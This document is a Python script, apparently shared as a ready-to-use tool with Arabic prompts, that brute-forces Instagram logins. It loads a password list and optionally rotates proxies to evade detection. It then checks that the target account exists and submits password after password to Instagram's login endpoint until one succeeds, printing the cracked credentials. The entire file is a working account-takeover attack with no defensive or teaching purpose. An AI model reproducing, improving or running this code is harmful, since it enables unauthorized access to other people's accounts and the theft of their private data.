print('''
                               ....                                         
                                    %                                       
                                     ^                                      
                            L                                               
                            "F3  $r                                         
                           $$$$.e$"  .                                      
                           "$$$$$"   "                                      
     (insTof)               $$$$c  /                                       
        .                   $$$$$$$P                                        
       ."c                      $$$                                         
      .$c3b                  ..J$$$$$e                                      
      4$$$$             .$$$$$$$$$$$$$$c                                    
       $$$$b           .$$$$$$$$$$$$$$$$r                                   
          $$$.        .$$$$$$$$$$$$$$$$$$                                   
           $$$c      .$$$$$$$  "$$$$$$$$$r                                  


Author   : Falah
snapchat : flaah999

           
           """""""""""""""""""""""""""""""" 
''')




import requests
import json
import time
import os
import random
import sys

os.system('clear')
os.system("figlet -f pagga ' Brute-Force ' | lolcat")
os.system("figlet -f pagga '      Attack      ' | lolcat")

#Help function
def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)

#The main class
class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		
		self.loadPasswords()
		
		self.IsUserExists()


		UsePorxy = Input('[*] هل تريد استخدام البروكسي؟ (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	#Check if password file exists and check if he contain passwords
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s يتم تحميل كلمات المرور بنجاح' % passwordsNumber)
				else:
					print('ملف كلمة المرور فارغ ، يرجى إضافة كلمات مرور إليه.')
					Input('[*] Press enter to exit')
					exit()
		else:
			print ('يرجى إنشاء ملف كلمات السر اسمه "%s"' % self.passwordsFile)
			Input('[*] Press enter to exit')
			exit()

	
	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print('[*] جاري اختبار البروكسي ...')
			print ('[*] الايبي المختار هو: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
		except Exception as e:
			print  ('[*] Can\'t reach proxy "%s"' % proxy)
		print('')


	
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] لم يتم العثور على المستخدم المسمى "٪ s"' % username)
			Input('[*] Press enter to exit')
			exit()
		elif (r.status_code == 200):
			return True

	#Try to login with password
	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#Update token after enter to the site
		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#parse response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])

			UsePorxy = Input('[*] هل تريد استخدام البروكسي؟ (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print ('[$] محاولة استخدام الوكيل بعد الفشل.')
				randomProxy() 
			return False

		 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False






instabrute = Instabrute(Input('الرجاء ادخال اسم المستخدم: '))

try:
	delayLoop = int(Input('[*] يرجى إضافة تأخير بين العمل الوحشي (بالثواني): ')) 
except Exception as e:
	print ('[*] خطأ ، يستخدم البرنامج القيمة الافتراضية "4"')
	delayLoop = 4
print ('')



for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		os.system("echo -n '[+] Login success ' | pv -qL 5 | lolcat")
		print (': %s' % [instabrute.username,password])
		break
	else:
		print ('[-] كلمة المرور خاطئة [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input(' هل تريد الخروج y/n: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		
